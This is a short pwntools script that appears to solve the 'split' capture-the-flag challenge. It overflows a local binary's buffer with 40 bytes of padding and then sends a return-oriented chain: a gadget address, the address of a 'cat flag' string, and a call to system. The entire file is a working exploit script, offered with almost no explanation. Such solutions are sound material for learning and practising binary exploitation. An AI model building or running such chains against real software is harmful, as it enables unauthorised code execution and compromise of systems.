#!/usr/bin/python3 


from pwn import *

elf = context.binary = ELF('split')
info("%#x system", elf.symbols.system)
system = p64(elf.symbols.system)
print_flag = p64(elf.symbols.usefulString)

io = process("./split")

offset_padding = 40
gadget_addr    = p64(0x004007c3) 
cat_flag_addr  = p64(0x00601060)
system_addr    = p64(0x0040074b)

payload = b'A'*offset_padding + gadget_addr + cat_flag_addr + system_addr

io.sendline(payload)
io.interactive()
while 1:
    try:
        print(io.recvline().decode())
    except:
        exit()
